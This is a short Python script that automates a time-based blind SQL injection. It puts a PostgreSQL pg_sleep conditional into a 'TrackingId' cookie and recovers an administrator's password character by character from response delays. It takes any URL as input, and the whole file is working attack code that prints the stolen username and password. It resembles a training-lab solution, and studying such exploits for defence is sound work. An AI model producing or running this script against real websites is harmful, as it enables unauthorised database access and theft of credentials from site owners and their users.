#!/usr/bin/python
import requests
import sys
import os
os.system("clear")
def main(url):
        print("---------------------------start------------------------------------")
        global TrackId
        ResponseTrack=requests.get(url)
        TrackId=ResponseTrack.headers.get("Set-Cookie").split(";")[0].split("=")[1]
        char="qwertyuiopasdfghjklzxcvbnm0123456789"
        password = ""
        try :
            for i in range(1,21):
                for j in char:
                    cookie={'TrackingId':str(TrackId)+"'||+(select+case+when(username='administrator'+and+substring(password,"+str(i)+",1)='"+j+"')+then+pg_sleep(7)+else+pg_sleep(0)+end+from+users)--"}
                    try:
                        requests.get(url,cookies=cookie,timeout=4) 
                    except :
                        try:
                            requests.get(url,cookies=cookie,timeout=6)
                        except:  
                            print(f"[{i}]===[{j}] --> Found")
                            password += j
            print("username : administrator") 
            print("password : "+str(password))
        except Exception:
            print("!! error check the url and try again")
            sys.exit
        print("---------------------------END------------------------------------")
print("""+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
         + Author : MEKUROKO007                                  +
         + github : https://github.com/MEKuroko007               +
         +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
        """)

url=input("enter the url : ")
if __name__ == '__main__':
    main(url)
